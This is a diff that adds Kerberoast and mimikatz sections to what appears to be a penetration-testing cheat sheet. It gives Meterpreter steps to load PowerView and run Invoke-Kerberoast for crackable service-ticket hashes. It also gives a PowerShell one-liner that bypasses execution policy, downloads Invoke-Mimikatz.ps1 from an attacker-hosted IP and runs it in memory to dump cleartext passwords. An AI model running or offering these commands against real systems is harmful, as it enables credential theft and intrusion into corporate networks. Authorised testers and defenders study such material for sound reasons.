@@ -106,7 +106,32 @@ sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
 ### hashcat
 ### Hydra
 ### Kerberoast
+When you have a Meterpreter shell on a target, you may be able to use the Kerberoast method to obtain crack-able strings from the target. 
+```
+load powershell
+```
+Then import PowerView.ps1 located in the '/root/Tools/PowerSploit/Recon'with the command.
+```
+powershell_import "/path/to/"PowerView.ps1
+```
+Open a PowerShell shell on the target using:
+```
+powershell_shell
+```
+So that you can run:
+```
+Invoke-Kerberoast | fl
+```
+If this method is successful, a hash or multiple hashes will be displayed in the output.
+
+The format for the hashes is not ideal for cracking. To ensure it is formatted correctly for tools like hashcat, copy and paste the hash into a file (i.e. raw-kerberoast-hash) and run the following command: 
+```
+'cat raw-kerberoast-hash | tr -d ' \r\n’ > kerberoast-hash'.
+```
 ### mimikatz
+
+The Invoke-Mimikatz.ps1 script (located in 'root/Tools/PowerSploit/Exfiltration’) can be used to dump cleartext credentials on a target. To dump credentials on your target, run the following command: 'powershell -nop -ep bypass “IEX (New-Object Net.WebClient).DownloadString('http://<ip address of machine hosting the ps1 file>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds'. If successful, you will see cleartext passwords associated with usernames.
+
 ### Responder
 Machines that don’t require SMB signing are vulnerable to SMB relaying.
 ```
